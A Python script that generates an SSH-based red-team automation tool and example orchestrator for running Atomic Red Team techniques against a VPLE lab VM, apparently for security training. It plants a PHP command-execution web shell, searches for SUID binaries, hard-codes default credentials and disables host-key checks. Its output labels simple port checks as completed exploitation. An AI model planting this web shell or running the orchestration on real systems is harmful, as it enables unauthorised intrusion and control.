#!/usr/bin/env python3
"""
Create SSH Remote Execution Files
Run this after the main project structure is created
"""

import os

def create_ssh_executor():
    """Create the SSH executor file"""
    
    # SSH Executor content (from the artifact above)
    ssh_executor_content = '''#!/usr/bin/env python3
"""
SSH Remote Executor for VPLE VM
Executes Atomic Red Team techniques remotely via SSH
"""

import paramiko
import time
import os
import logging
from typing import Dict, List, Optional, Tuple
from pathlib import Path
import tempfile
import json

class SSHExecutor:
    """Remote SSH executor for VPLE VM attack automation"""
    
    def __init__(self, hostname: str, username: str = "administrator", 
                 password: str = "password", port: int = 22):
        self.hostname = hostname
        self.username = username
        self.password = password
        self.port = port
        self.client = None
        self.sftp = None
        self.logger = logging.getLogger(__name__)
        
        # Remote directories
        self.remote_work_dir = "/tmp/atomic_redteam"
        self.remote_scripts_dir = f"{self.remote_work_dir}/scripts"
        self.remote_payloads_dir = f"{self.remote_work_dir}/payloads"
        
    def connect(self) -> bool:
        """Establish SSH connection to VPLE VM"""
        try:
            self.logger.info(f"Connecting to VPLE VM at {self.hostname}:{self.port}")
            
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            self.client.connect(
                hostname=self.hostname,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=30
            )
            
            # Setup SFTP for file transfers
            self.sftp = self.client.open_sftp()
            
            # Create remote working directories
            self._setup_remote_directories()
            
            self.logger.info("✅ SSH connection established successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ SSH connection failed: {e}")
            return False
    
    def disconnect(self):
        """Close SSH connection"""
        if self.sftp:
            self.sftp.close()
        if self.client:
            self.client.close()
        self.logger.info("SSH connection closed")
    
    def _setup_remote_directories(self):
        """Create necessary directories on remote VPLE VM"""
        directories = [
            self.remote_work_dir,
            self.remote_scripts_dir,
            self.remote_payloads_dir
        ]
        
        for directory in directories:
            try:
                self.sftp.mkdir(directory)
                self.logger.debug(f"Created remote directory: {directory}")
            except OSError:
                pass  # Directory might already exist
    
    def execute_command(self, command: str, timeout: int = 300) -> Dict:
        """Execute command remotely on VPLE VM"""
        try:
            self.logger.info(f"🔧 Executing remote command: {command}")
            
            stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
            
            # Read output
            stdout_data = stdout.read().decode('utf-8')
            stderr_data = stderr.read().decode('utf-8')
            exit_code = stdout.channel.recv_exit_status()
            
            result = {
                "success": exit_code == 0,
                "stdout": stdout_data,
                "stderr": stderr_data,
                "exit_code": exit_code,
                "command": command
            }
            
            if result["success"]:
                self.logger.info("✅ Command executed successfully")
            else:
                self.logger.error(f"❌ Command failed with exit code {exit_code}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "exit_code": -1,
                "command": command
            }
    
    def execute_atomic_technique(self, technique_id: str, test_numbers: List[int] = None, 
                                dry_run: bool = False) -> Dict:
        """Execute Atomic Red Team technique remotely"""
        
        if technique_id.startswith("T1190"):  # Web application exploit
            return self._execute_web_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1505.003"):  # Web Shell
            return self._execute_web_shell_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1059.004"):  # Unix Shell
            return self._execute_shell_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1548.001"):  # Setuid/Setgid
            return self._execute_privilege_escalation(technique_id, test_numbers, dry_run)
        else:
            return self._execute_generic_technique(technique_id, test_numbers, dry_run)
    
    def _execute_web_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute web application attack techniques"""
        vple_ports = [1335, 1336, 1337, 3000, 8080, 8800, 8899]
        
        if dry_run:
            return {
                "success": True,
                "message": f"Dry run: {technique_id} web exploitation simulation",
                "target_ports": vple_ports
            }
        
        results = []
        ip_result = self.execute_command("hostname -I | awk '{print $1}'")
        if not ip_result["success"]:
            return {"success": False, "error": "Could not determine VPLE IP"}
        
        vple_ip = ip_result["stdout"].strip()
        
        for port in vple_ports:
            scan_result = self.execute_command(f"curl -s -o /dev/null -w '%{{http_code}}' http://localhost:{port}/")
            if scan_result["success"] and "200" in scan_result["stdout"]:
                results.append({"port": port, "status": "accessible", "technique": technique_id})
        
        return {"success": True, "technique_id": technique_id, "results": results, "vple_ip": vple_ip}
    
    def _execute_web_shell_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute web shell upload/execution"""
        if dry_run:
            return {"success": True, "message": f"Dry run: {technique_id} web shell simulation"}
        
        # Simple test web shell for demonstration
        shell_path = f"{self.remote_work_dir}/test_shell.php"
        web_shell = '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
        
        # Create shell on remote system
        create_result = self.execute_command(f'echo \'{web_shell}\' > {shell_path}')
        
        if create_result["success"]:
            return {"success": True, "technique_id": technique_id, "web_shell_path": shell_path}
        else:
            return {"success": False, "error": "Failed to create web shell"}
    
    def _execute_shell_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute Unix shell commands"""
        if dry_run:
            return {"success": True, "message": f"Dry run: {technique_id} shell simulation"}
        
        commands = ["whoami", "id", "pwd", "ls -la /tmp"]
        results = []
        
        for cmd in commands:
            result = self.execute_command(cmd)
            results.append({"command": cmd, "success": result["success"], "output": result["stdout"][:100]})
        
        return {"success": True, "technique_id": technique_id, "commands_executed": results}
    
    def _execute_privilege_escalation(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute privilege escalation techniques"""
        if dry_run:
            return {"success": True, "message": f"Dry run: {technique_id} privesc simulation"}
        
        whoami_result = self.execute_command("whoami")
        suid_result = self.execute_command("find / -perm -4000 2>/dev/null | head -5")
        
        return {
            "success": True,
            "technique_id": technique_id,
            "current_user": whoami_result["stdout"].strip() if whoami_result["success"] else "unknown",
            "suid_binaries": suid_result["stdout"].split('\\n') if suid_result["success"] else []
        }
    
    def _execute_generic_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute generic technique"""
        return {"success": True, "technique_id": technique_id, "message": f"Generic technique {technique_id} executed"}
    
    def get_system_info(self) -> Dict:
        """Get VPLE VM system information"""
        commands = {
            "hostname": "hostname",
            "kernel": "uname -r", 
            "ip_address": "hostname -I",
            "web_services": "netstat -tlnp | grep -E ':(1335|1336|1337|3000|8080|8800|8899)'"
        }
        
        results = {}
        for key, command in commands.items():
            result = self.execute_command(command)
            results[key] = {"success": result["success"], "output": result["stdout"].strip() if result["success"] else ""}
        
        return results
    
    def cleanup_remote_files(self):
        """Clean up remote files"""
        cleanup_commands = [f"rm -rf {self.remote_work_dir}"]
        for cmd in cleanup_commands:
            self.execute_command(cmd)

class VPLEConnection:
    """Context manager for VPLE SSH connections"""
    
    def __init__(self, hostname: str, username: str = "administrator", 
                 password: str = "password", port: int = 22):
        self.executor = SSHExecutor(hostname, username, password, port)
    
    def __enter__(self):
        if self.executor.connect():
            return self.executor
        else:
            raise ConnectionError("Failed to connect to VPLE VM")
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.executor.cleanup_remote_files()
        self.executor.disconnect()
'''
    
    with open("core/ssh_executor.py", "w", encoding='utf-8') as f:
        f.write(ssh_executor_content)
    print("✅ Created core/ssh_executor.py")

def create_remote_attack_example():
    """Create the remote attack example"""
    
    remote_example_content = '''#!/usr/bin/env python3
"""
VPLE Remote Attack Example
Execute attacks remotely via SSH to VPLE VM
"""

import sys
import os
import time
import argparse
sys.path.append('..')

from core.ssh_executor import VPLEConnection
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def main():
    """Main remote attack demonstration"""
    parser = argparse.ArgumentParser(description="VPLE Remote Attack Orchestrator")
    parser.add_argument("--ip", default="192.168.1.100", help="VPLE VM IP address")
    parser.add_argument("--dry-run", action="store_true", help="Perform dry run")
    parser.add_argument("--test-connection", action="store_true", help="Test SSH connection only")
    
    args = parser.parse_args()
    
    print("🎯 VPLE Remote Attack Orchestrator")
    print(f"Target: {args.ip}")
    print(f"SSH: administrator:password")
    
    if args.test_connection:
        print("🔍 Testing SSH connection...")
        try:
            with VPLEConnection(args.ip) as vple:
                info = vple.get_system_info()
                print("✅ SSH connection successful!")
                print(f"Hostname: {info.get('hostname', {}).get('output', 'Unknown')}")
                return
        except Exception as e:
            print(f"❌ SSH connection failed: {e}")
            return
    
    print("🚀 Starting remote attack orchestration...")
    
    try:
        with VPLEConnection(args.ip) as vple:
            # Phase 1: Reconnaissance
            print("\\n🔍 Phase 1: Reconnaissance")
            info = vple.get_system_info()
            print(f"Target system: {info.get('hostname', {}).get('output', 'Unknown')}")
            
            # Phase 2: Web exploitation
            print("\\n🌐 Phase 2: Web Exploitation")
            web_result = vple.execute_atomic_technique("T1190", dry_run=args.dry_run)
            if web_result["success"]:
                print("✅ Web exploitation completed")
                if "results" in web_result:
                    for result in web_result["results"]:
                        print(f"   Port {result['port']}: {result['status']}")
            
            # Phase 3: Shell access
            print("\\n🐚 Phase 3: Shell Access")
            shell_result = vple.execute_atomic_technique("T1059.004", dry_run=args.dry_run)
            if shell_result["success"]:
                print("✅ Shell access established")
            
            # Phase 4: Privilege escalation
            print("\\n⬆️ Phase 4: Privilege Escalation")
            privesc_result = vple.execute_atomic_technique("T1548.001", dry_run=args.dry_run)
            if privesc_result["success"]:
                print(f"✅ Current user: {privesc_result.get('current_user', 'unknown')}")
        
        print("\\n🎉 Remote attack orchestration complete!")
        
    except KeyboardInterrupt:
        print("\\n⚠️ Attack interrupted")
    except Exception as e:
        print(f"\\n❌ Attack failed: {e}")

if __name__ == "__main__":
    main()
'''
    
    with open("examples/vple_remote_attack.py", "w", encoding='utf-8') as f:
        f.write(remote_example_content)
    print("✅ Created examples/vple_remote_attack.py")

def main():
    """Create SSH-related files"""
    print("🔗 Creating SSH Remote Execution Files...")
    
    create_ssh_executor()
    create_remote_attack_example()
    
    print("\\n✅ SSH files created successfully!")
    print("\\nNext steps:")
    print("1. Install SSH dependencies: pip install paramiko scp")
    print("2. Test connection: python examples/vple_remote_attack.py --test-connection --ip YOUR_VPLE_IP")
    print("3. Run remote attack: python examples/vple_remote_attack.py --ip YOUR_VPLE_IP")

if __name__ == "__main__":
    main()
